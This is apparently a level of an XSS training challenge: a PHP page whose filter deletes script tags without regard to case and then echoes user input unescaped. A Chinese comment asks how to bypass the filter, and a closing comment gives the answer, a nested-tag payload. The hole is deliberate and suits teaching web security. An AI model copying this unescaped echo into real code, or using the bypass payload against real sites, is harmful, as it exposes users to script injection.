<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<title>XSS-4</title>
</head>
<body>
<form action="xss-4.php" method="get">
<input type="text" name="xss_input">
<input type="submit">
</form>
<hr>
<?php
//替换<script>,</script>标签  当大小写不敏感时该如何绕过
function xss_filter($xss) {
	$xss=str_ireplace("<script>","",$xss);
	$xss=str_ireplace("</script>","",$xss);
	$xss=str_replace("'","",$xss);
	$xss=str_replace("\"","",$xss);
	$xss=str_replace(";","",$xss);
	Return $xss;
}
$xss = $_GET['xss_input'];
$xss=xss_filter($xss);
echo 'You input is<br>'.$xss;
#answer:<scr<script>ipt>alert(`xss`)</s</script>cript>
?>
</body>

</html>

	